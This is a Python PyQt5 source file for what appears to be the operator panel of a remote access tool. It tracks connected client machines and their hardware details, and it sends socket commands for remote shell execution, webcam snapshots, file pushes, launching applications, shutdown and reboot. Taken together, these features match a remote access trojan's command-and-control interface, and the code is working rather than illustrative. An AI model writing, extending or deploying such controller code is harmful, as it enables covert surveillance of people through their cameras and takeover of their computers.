import json
import os
import base64
import logging
from PyQt5.QtWidgets import QTableWidgetItem, QFileDialog, QInputDialog, QMessageBox
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QImage, QPixmap

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ClientManager:
    def __init__(self, server_gui):
        self.server_gui = server_gui

    def update_client_info(self, client_id, client_info, addr):
        try:
            if not hasattr(self.server_gui, 'table') or self.server_gui.table is None:
                logging.error(f"Table widget not found in server_gui for client ID={client_id}")
                QMessageBox.critical(self.server_gui, "Error", "Table widget not initialized")
                return

            ip = client_info.get('peer_ip', client_info.get('ip', 'Unknown'))
            gpu = client_info.get('gpu', 'Unknown')
            cpu = client_info.get('cpu', 'Unknown')
            ram = client_info.get('ram', 'Unknown')
            os_info = client_info.get('os', 'Unknown')
            
            found = False
            for row in range(self.server_gui.table.rowCount()):
                item = self.server_gui.table.item(row, 0)
                if item and item.data(Qt.UserRole) == client_id:
                    self.server_gui.table.setItem(row, 1, QTableWidgetItem(ip))
                    self.server_gui.table.setItem(row, 2, QTableWidgetItem(gpu))
                    self.server_gui.table.setItem(row, 3, QTableWidgetItem(cpu))
                    self.server_gui.table.setItem(row, 4, QTableWidgetItem(ram))
                    self.server_gui.table.setItem(row, 5, QTableWidgetItem(os_info))
                    self.server_gui.table.setRowHeight(row, 100)
                    found = True
                    break
            if not found:
                row = self.server_gui.table.rowCount()
                self.server_gui.table.insertRow(row)
                self.server_gui.table.setRowHeight(row, 100)
                item = QTableWidgetItem()
                item.setData(Qt.UserRole, client_id)
                self.server_gui.table.setItem(row, 0, item)
                self.server_gui.table.setItem(row, 1, QTableWidgetItem(ip))
                self.server_gui.table.setItem(row, 2, QTableWidgetItem(gpu))
                self.server_gui.table.setItem(row, 3, QTableWidgetItem(cpu))
                self.server_gui.table.setItem(row, 4, QTableWidgetItem(ram))
                self.server_gui.table.setItem(row, 5, QTableWidgetItem(os_info))
            logging.info(f"Client info updated: ID={client_id}, IP={ip}")
        except Exception as e:
            logging.error(f"Failed to update client info: ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to update client info: {e}")

    def remove_client(self, client_id):
        try:
            if client_id in self.server_gui.clients:
                if not hasattr(self.server_gui, 'table') or self.server_gui.table is None:
                    logging.error(f"Table widget not found in server_gui for client ID={client_id}")
                    QMessageBox.critical(self.server_gui, "Error", "Table widget not initialized")
                    return
                for row in range(self.server_gui.table.rowCount()):
                    item = self.server_gui.table.item(row, 0)
                    if item and item.data(Qt.UserRole) == client_id:
                        self.server_gui.table.removeRow(row)
                        break
                if client_id in self.server_gui.file_managers:
                    self.server_gui.file_managers[client_id].close()
                    del self.server_gui.file_managers[client_id]
                if client_id in self.server_gui.client_screenshots:
                    del self.server_gui.client_screenshots[client_id]
                if client_id in self.server_gui.shell_windows:
                    self.server_gui.shell_windows[client_id].close()
                    del self.server_gui.shell_windows[client_id]
                del self.server_gui.clients[client_id]
                logging.info(f"Client removed: ID={client_id}")
        except Exception as e:
            logging.error(f"Failed to remove client: ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to remove client: {e}")

    def handle_response(self, message, client_id):
        if client_id not in self.server_gui.clients:
            logging.warning(f"Client ID={client_id} not found in clients")
            return
        client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
        try:
            message_type = message.get('type', '')
            data = message.get('data', '')

            if message_type == 'file_response':
                if isinstance(data, list):
                    if client_id in self.server_gui.file_managers:
                        self.server_gui.file_managers[client_id].update_file_list(data)
                elif isinstance(data, str) and data.startswith('iVBOR'):
                    if client_id in self.server_gui.file_managers:
                        self.server_gui.file_managers[client_id].update_preview(data)
                    save_path, _ = QFileDialog.getSaveFileName(self.server_gui, "Save File", "", "PNG Files (*.png)")
                    if save_path:
                        try:
                            image_data = base64.b64decode(data)
                            image = QImage()
                            image.loadFromData(image_data)
                            if image.isNull():
                                raise ValueError("Invalid image data")
                            scale_factor = 2.0
                            new_size = image.size() * scale_factor
                            pixmap = QPixmap.fromImage(image).scaled(new_size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                            pixmap.save(save_path, "PNG")
                            QMessageBox.information(self.server_gui, "Success", "File downloaded and resized successfully")
                        except Exception as e:
                            logging.error(f"Failed to save file: Client ID={client_id}, Error={e}")
                            QMessageBox.critical(self.server_gui, "Error", f"Failed to save file: {e}")
                else:
                    logging.info(f"File operation result: {data}")
                    QMessageBox.information(self.server_gui, "File Response", f"File operation result: {data or 'No output'}")
            
            elif message_type == 'shell_response':
                if client_id in self.server_gui.shell_windows:
                    self.server_gui.shell_response_signal.emit(client_id, data or "No output")
                else:
                    logging.warning(f"No shell window found for client ID={client_id}")
                    QMessageBox.information(self.server_gui, "Shell Response", f"Shell output: {data or 'No output'}")
            
            elif message_type == 'camera_response':
                if isinstance(data, str) and data.startswith('iVBOR'):
                    save_path, _ = QFileDialog.getSaveFileName(self.server_gui, "Save Camera Snapshot", "", "PNG Files (*.png)")
                    if save_path:
                        try:
                            image_data = base64.b64decode(data)
                            image = QImage()
                            image.loadFromData(image_data)
                            if image.isNull():
                                raise ValueError("Invalid image data")
                            pixmap = QPixmap.fromImage(image)
                            pixmap.save(save_path, "PNG")
                            QMessageBox.information(self.server_gui, "Success", "Camera snapshot saved successfully")
                        except Exception as e:
                            logging.error(f"Failed to save camera snapshot: Client ID={client_id}, Error={e}")
                            QMessageBox.critical(self.server_gui, "Error", f"Failed to save camera snapshot: {e}")
                else:
                    logging.info(f"Camera operation result: {data}")
                    QMessageBox.information(self.server_gui, "Camera Response", f"Camera operation result: {data or 'No output'}")
            
            elif message_type == 'response':
                logging.info(f"General response: {data}")
                QMessageBox.information(self.server_gui, "Response", f"Operation result: {data or 'No result'}")
            
            else:
                logging.warning(f"Unknown message type: {message_type}")
                QMessageBox.warning(self.server_gui, "Warning", f"Unknown message type: {message_type}")
        
        except Exception as e:
            logging.error(f"Failed to handle response: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to handle response: {e}")

    def shutdown_client(self, client_id):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                return
            client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
            self.server_gui.clients[client_id]['socket'].send(json.dumps({'type': 'shutdown'}).encode())
            QMessageBox.information(self.server_gui, "Command Sent", f"Shutdown command sent to client {client_ip}")
            logging.info(f"Shutdown command sent: Client ID={client_id}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send shutdown command: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send shutdown command: {e}")

    def reboot_client(self, client_id):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                return
            client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
            self.server_gui.clients[client_id]['socket'].send(json.dumps({'type': 'reboot'}).encode())
            QMessageBox.information(self.server_gui, "Command Sent", f"Reboot command sent to client {client_ip}")
            logging.info(f"Reboot command sent: Client ID={client_id}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send reboot command: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send reboot command: {e}")

    def open_application(self, client_id):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                return
            app_name, ok = QInputDialog.getText(self.server_gui, "Open Application", "Enter application name (e.g., notepad.exe):")
            if ok and app_name:
                client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
                self.server_gui.clients[client_id]['socket'].send(json.dumps({'type': 'open_app', 'data': app_name}).encode())
                QMessageBox.information(self.server_gui, "Command Sent", f"Open app command sent: {app_name}")
                logging.info(f"Open app command sent: Client ID={client_id}, App={app_name}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send open app command: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send open app command: {e}")

    def send_file(self, client_id):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                return
            file_path, _ = QFileDialog.getOpenFileName(self.server_gui, "Select File", "", "All Files (*)")
            if file_path:
                client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
                with open(file_path, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                filename = os.path.basename(file_path)
                self.server_gui.clients[client_id]['socket'].send(json.dumps({
                    'type': 'send_file',
                    'data': {'filename': filename, 'content': file_data}
                }).encode())
                QMessageBox.information(self.server_gui, "Command Sent", f"File sent: {filename}")
                logging.info(f"File sent: Client ID={client_id}, File={filename}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send file: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send file: {e}")

    def remote_shell(self, client_id, command):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                QMessageBox.critical(self.server_gui, "Error", f"Client ID={client_id} not found")
                return
            client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
            self.server_gui.clients[client_id]['socket'].send(json.dumps({'type': 'shell', 'data': command}).encode())
            logging.info(f"Shell command sent: Client ID={client_id}, Command={command}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send shell command: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send shell command: {e}")

    def capture_camera(self, client_id):
        try:
            if client_id not in self.server_gui.clients:
                logging.warning(f"Client ID={client_id} not found in clients")
                return
            client_ip = self.server_gui.clients[client_id]['info'].get('peer_ip', self.server_gui.clients[client_id]['info'].get('ip', 'Unknown'))
            self.server_gui.clients[client_id]['socket'].send(json.dumps({'type': 'camera'}).encode())
            QMessageBox.information(self.server_gui, "Command Sent", f"Camera capture command sent to client {client_ip}")
            logging.info(f"Camera command sent: Client ID={client_id}, IP={client_ip}")
        except Exception as e:
            logging.error(f"Failed to send camera command: Client ID={client_id}, Error={e}")
            QMessageBox.critical(self.server_gui, "Error", f"Failed to send camera command: {e}")